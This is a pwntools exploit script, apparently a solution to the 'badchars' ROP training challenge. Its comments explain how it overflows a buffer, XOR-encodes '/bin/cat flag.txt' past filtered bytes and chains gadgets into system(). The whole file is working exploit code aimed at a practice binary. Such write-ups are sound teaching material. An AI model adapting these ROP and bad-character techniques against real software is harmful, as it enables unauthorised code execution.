#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sum
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('badchars')
context.terminal = "terminator -x".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.pwnme:x}
break *0x4009b0
break *0x4009dc
continue
'''.format(**locals())

io = start()

# This program has a buffer overflow. The pwnme() function
# calls fgets(buf, 50, stdin), although the buffer is only
# 32 bytes large ...

# Just look at 'objdump -M intel -d ./badchars'. In addition to
# the usual main() calling pwnme(), you'll see the usefulGadgets()
# function containing the gadgets
#    - 'xor [r15],r14b; ret' and 'pop r14; pop r15; ret': XOR a
#      byte in memory (where we want) with a value at our choice.
#    - 'mov [r13], r12; ret' and 'pop r12; pop r13; ret': write
#       arbitrary 8-byte words where we want
# We can use the -b option of ropper to make sure the gadget themselves
# do not contain badchars (0x62='b', 0x69='i', etc.):
#
#    $ ropper -f badchars --type=rop  -b='6269632f20666e73'
#
# The plan is to write a ROP chain that does the following:
#   - Write "/bin/cat flag.txt" (XOR key) to a fixed address
#   - Load the fixed address into rdi 
#   - Return to system@plt
#
# We need to find a place to store the string to be crafted,
# and we want it to have a fixed address (assuming PIE is disabled).
# We could look for writable sections using rabin2:
#
#    $ rabin2 -S badchars
#
# But the problem is that sections may be overlapped, so it's not
# easy to understand whether a certain range of addresses is actually
# writable. A better approach is to look at vmmap (gdb command),
# which also shows address ranges and permissions.
# Or even look at the program headers of the ELF (readelf -Wl).

# Wait for the prompt.
msg = io.recvuntil("> ")
print(msg)

# Build the input vector as 40 arbitrary bytes plus the ROP chain,
# that will overwrithe the saved RIP. Of course the arbitrary bytes
# must not contain badchars
vector = "B" * 40

def append_write(chain, addr, value):
    # Return address of the gadget 'pop r12; pop r13; ret'
    chain += p64(0x400b3b)
    # The values for r12
    chain += p64(value)
    # The values for r13
    chain += p64(addr)
    # Return address of the gadget 'mov [r13], r12; ret'
    chain += p64(0x400b34)
    return chain

def append_xor(chain, addr, bytekey):
    # Return address of the gadget 'pop r14; pop r15; ret'
    chain += p64(0x400b40)
    # The values for r14
    chain += p64(bytekey)
    # The values for r15
    chain += p64(addr)
    # Return address of the gadget 'xor [r15],r14b; ret'
    chain += p64(0x400b30)
    return chain

# A function to find a 8-bit XOR key to be applied to a string in
# order to remove badchars ...
def find_xor_key(alphabet, badchars):
    for k in range(1, 256):
        # Let's try with this key ...
        encoded = [chr(ord(c) ^ k) for c in alphabet]
        # Check that the encoding process completely removed
        # badchars from our alphabet
        bad = False
        for e in encoded:
            if e in badchars:
                bad = True
                break

        if not bad:
            return k

    print("Error: could not find a XOR bytekey")
    assert(False)
 
def write_string(chain, addr, s, badchars):
    # Pad the string with zeroes.
    s += '\x00' * (8 - (len(s) % 8))

    # Find a suitable XOR key.
    bytekey = find_xor_key(s, badchars)
    print("XOR bytekey found: %s (%s)" % (bytekey, repr(chr(bytekey))))

    # Extend the ROP chain to write the string in memory.
    i = 0
    while i < len(s):
        chain = append_write(chain, addr + i, u64(s[i:i+8]))
        i += 8

    # Extend the ROP chain to decode the string in place.
    i = 0
    while i < len(s):
        chain = append_xor(chain, addr + i, bytekey)
        i += 1

    return chain

# We will write somewhere in the middle of the range [0x601000,0x602000),
# which is writable, as shown by vmmap. Writing to the beginning of
# this range also works if we only write 8 bytes (writing more than
# that will crash the program before we can get to execute the
# desired command... remember that we are corrupting memory, so who
# knows why we get a crash).
dest_addr = 0x601f00

vector = write_string(vector, dest_addr, '/bin/cat flag.txt', 'bic/ fns')

# Append the address of a 'pop rdi; ret' gadget,
# and the value of rdi (address of the crafted string).
vector += p64(0x400b39)
vector += p64(dest_addr)

# Return to system@plt (rabin2 -i ./badchars)
vector += p64(0x4006f0)

io.sendline(vector)
io.interactive()
